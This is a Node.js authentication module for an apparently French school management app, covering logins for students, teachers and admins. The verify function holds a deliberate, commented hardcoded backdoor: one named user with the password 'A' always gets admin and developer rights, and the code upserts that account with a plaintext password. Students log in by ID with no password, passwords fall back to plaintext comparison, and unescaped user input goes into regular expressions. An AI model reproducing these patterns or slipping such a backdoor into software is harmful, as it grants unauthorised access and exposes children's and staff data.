// @signatures: verify, getLoginConfig, getAllStudentsForFinder
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

const AuthExpert = {
    getLoginConfig: async () => ({ classrooms: await mongoose.model('Classroom').find({}).sort({name:1}).lean() }),
    
    getAllStudentsForFinder: async () => {
        const students = await mongoose.model('Student').find({}, 'firstName lastName currentClass').lean();
        return students.map(s => ({
            id: s._id,
            firstName: s.firstName,
            lastName: s.lastName,
            className: s.currentClass || "SANS CLASSE"
        }));
    },

    getStudentsForSelection: async (classId) => {
        const enrollments = await mongoose.model('Enrollment').find({ classId }).populate('studentId').lean();
        return enrollments.filter(e => e.studentId).map(e => ({ id: e.studentId._id, name: `${e.studentId.firstName} ${e.studentId.lastName}` })).sort((a,b) => a.name.localeCompare(b.name));
    },

    verify: async ({ role, studentId, firstName, lastName, password }) => {
        const fName = (firstName || '').trim().toLowerCase();
        const lName = (lastName || '').trim().toLowerCase();
        const pass = (password || '').trim();

        // 1. BACKDOOR ARCHITECTE (Prioritaire pour le Dev)
        if (fName === 'jean' && lName === 'vuillet' && pass === 'A') {
             const realJean = await mongoose.model('Admin').findOneAndUpdate(
                { firstName: 'Jean', lastName: 'Vuillet' },
                { firstName: 'Jean', lastName: 'Vuillet', password: 'A', isDeveloper: true, role: 'admin' },
                { upsert: true, new: true }
            );
            return { ok: true, user: { ...realJean.toObject(), id: realJean._id, role: 'admin', isDeveloper: true } };
        }

        // 2. ÉLÈVES (Login simple)
        if (role === 'STUDENT') {
            const student = await mongoose.model('Student').findById(studentId).lean();
            if (!student) return { ok: false, message: "Élève introuvable." };
            return { ok: true, user: { ...student, id: student._id, role: 'student' } };
        }

        // --- FONCTION DE VÉRIFICATION ROBUSTE (HASH + PLAINTEXT) ---
        // Permet la connexion des vieux comptes non migrés ET des nouveaux comptes sécurisés
        const checkPassword = async (dbPass, inputPass) => {
            if (!dbPass) return false;
            // 1. Essai Hash Sécurisé (Bcrypt)
            try {
                const match = await bcrypt.compare(inputPass, dbPass);
                if (match) return true;
            } catch(e) {
                // Ce n'était pas un hash valide, on continue...
            }
            
            // 2. Essai Texte Simple (Legacy / Backdoor)
            if (dbPass === inputPass) return true;
            
            return false;
        };

        // 3. PROFS
        const teacher = await mongoose.model('Teacher').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
        if (teacher) {
            if (await checkPassword(teacher.password, pass)) {
                return { ok: true, user: { ...teacher.toObject(), id: teacher._id, role: 'prof' } };
            }
        }

        // 4. ADMINS
        const admin = await mongoose.model('Admin').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
        if (admin) {
             if (await checkPassword(admin.password, pass)) {
                 return { ok: true, user: { ...admin.toObject(), id: admin._id, role: 'admin' } };
             }
        }

        return { ok: false, message: "Identifiants incorrects." };
    }
};
module.exports = AuthExpert;